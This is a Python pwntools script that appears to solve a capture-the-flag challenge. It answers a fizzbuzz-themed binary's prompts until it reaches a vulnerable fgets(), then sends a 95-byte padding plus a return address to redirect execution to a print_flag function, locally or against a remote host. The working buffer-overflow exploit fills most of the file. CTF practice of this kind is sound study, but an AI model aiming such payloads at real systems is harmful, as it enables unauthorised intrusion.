#!/usr/bin/env python3

from pwn import context, ELF, log, p32, remote, sys 

elf = ELF('./vuln', checksec=False)
context.binary = elf

messages = [
    'fizz',

    'buzz',
    'fizz',

    'fizz',
    'buzz',

    'fizz',

    'fizzbuzz',

    'fizz',

    'buzz',
    'fizz',

    'fizz',
    'buzz',

    'fizz',

    'fizzbuzz',

    'fizz',

    'buzz',
    'fizz',

    'fizz',
    'buzz',

    'fizz',

    'fizzbuzz',

    'fizz',

    'buzz',
    'fizz',

    'fizz',
    'buzz',

    'fizz',

    'fizzbuzz',

    'fizz',

    'buzz',
    'fizz'
]


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


def answer(n: int) -> bytes:
    if n % 15 == 0:
        return b'fizzbuzz'
    if n % 3 == 0:
        return b'fizz'
    if n % 5 == 0:
        return b'buzz'

    return str(n).encode()


def get_number(p) -> int:
    return int(p.recvuntil(b'? ').decode().rstrip('? '))


def pass_messages(p):
    while len(messages):
        data = p.recvuntil(b'? ').decode().splitlines()

        if len(data) >= 2:
            if data[0] != messages.pop(0):
                log.error('Unexpected message')

        if len(data) == 3:
            if data[1] != messages.pop(0):
                log.error('Unexpected message')

        number = int(data[-1].rstrip('? '))

        p.sendline(answer(number))


def pass_function(p):
    number = get_number(p)
    p.sendline(answer(number))

    while (number := get_number(p)) != 1:
        p.sendline(answer(number))


def pass_functions(p, n: int):
    p.sendlineafter(b'? ', b'0')

    for _ in range(n):
        pass_function(p)
        p.sendline(b'0')

    log.info(f'Passed {n} function' + ('s' if n > 1 else ''))


def main():
    p = get_process()

    pass_messages(p)
    log.info('Passed messages')

    pass_functions(p, 8)
    pass_functions(p, 1)
    pass_functions(p, 22)

    for i in range(4):
        p.sendlineafter(b'? ', answer(i + 1))

    p.sendlineafter(b'? ', b'0')

    log.info('Arrived to vulnerable fgets()')

    offset = 95
    junk = b'A' * offset

    print_flag_addr = 0x08048656

    payload = junk + p32(print_flag_addr)

    p.sendlineafter(b'? ', b'0' + b' ' * 8 + payload)

    log.success(f'Flag: {p.recvline().decode()}')

    p.close()


if __name__ == '__main__':
    main()
